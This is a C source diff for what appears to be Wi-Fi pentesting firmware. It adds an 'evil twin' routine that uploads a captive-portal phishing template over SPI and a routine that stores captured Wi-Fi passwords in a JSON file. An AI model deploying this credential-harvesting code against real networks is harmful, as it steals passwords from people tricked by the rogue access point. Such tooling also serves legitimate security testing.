@@ -15,8 +15,15 @@
 
 #include "evil_twin.h"
 #include "spi_bridge.h"
+#include "tos_storage_paths.h"
+#include "storage_read.h"
+#include "storage_write.h"
+#include "storage_assets.h"
+#include "cJSON.h"
 #include "esp_log.h"
 #include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
 
 static const char *TAG = "EVIL_TWIN_BACKEND";
 static bool has_password = false;
@@ -82,4 +89,89 @@ void evil_twin_get_last_password(char *out, size_t len) {
         return;
     }
     out[0] = '\0';
+}
+
+bool evil_twin_upload_template(const char *path) {
+    if (!path) return false;
+
+    // Try SD first, then flash assets
+    char *html = NULL;
+    size_t size = 0;
+
+    FILE *f = fopen(path, "r");
+    if (f) {
+        fseek(f, 0, SEEK_END);
+        size = (size_t)ftell(f);
+        fseek(f, 0, SEEK_SET);
+        if (size > 0 && size <= 8192) {
+            html = malloc(size);
+            if (html) fread(html, 1, size, f);
+        }
+        fclose(f);
+    }
+
+    if (!html) {
+        html = (char *)storage_assets_load_file(path, &size);
+    }
+
+    if (!html || size == 0) {
+        ESP_LOGE(TAG, "Failed to read template: %s", path);
+        return false;
+    }
+
+    // Send BEGIN with total size
+    uint8_t begin_payload[2];
+    begin_payload[0] = (uint8_t)(size & 0xFF);
+    begin_payload[1] = (uint8_t)((size >> 8) & 0xFF);
+    if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_TMPL_BEGIN, begin_payload, 2, NULL, NULL, 2000) != ESP_OK) {
+        free(html);
+        ESP_LOGE(TAG, "Template BEGIN failed");
+        return false;
+    }
+
+    // Send chunks
+    size_t offset = 0;
+    while (offset < size) {
+        size_t chunk = size - offset;
+        if (chunk > 252) chunk = 252;
+        if (spi_bridge_send_command(SPI_ID_WIFI_EVIL_TWIN_TMPL_CHUNK,
+                                    (uint8_t *)(html + offset), (uint8_t)chunk,
+                                    NULL, NULL, 2000) != ESP_OK) {
+            free(html);
+            ESP_LOGE(TAG, "Template CHUNK failed at offset %u", (unsigned)offset);
+            return false;
+        }
+        offset += chunk;
+    }
+
+    free(html);
+    ESP_LOGI(TAG, "Template uploaded: %u bytes", (unsigned)size);
+    return true;
+}
+
+void evil_twin_save_password(const char *password) {
+    if (!password || password[0] == '\0') return;
+
+    const char *json_path = TOS_PATH_CAPTIVE "/passwords.json";
+
+    cJSON *root = NULL;
+    char buf[2048];
+    if (storage_read_string(json_path, buf, sizeof(buf)) == ESP_OK) {
+        root = cJSON_Parse(buf);
+    }
+    if (!root) {
+        root = cJSON_CreateArray();
+    }
+
+    cJSON *entry = cJSON_CreateObject();
+    cJSON_AddStringToObject(entry, "password", password);
+    cJSON_AddItemToArray(root, entry);
+
+    char *json_str = cJSON_PrintUnformatted(root);
+    cJSON_Delete(root);
+    if (json_str) {
+        storage_write_string(json_path, json_str);
+        free(json_str);
+        ESP_LOGI(TAG, "Password saved to SD");
+    }
 }
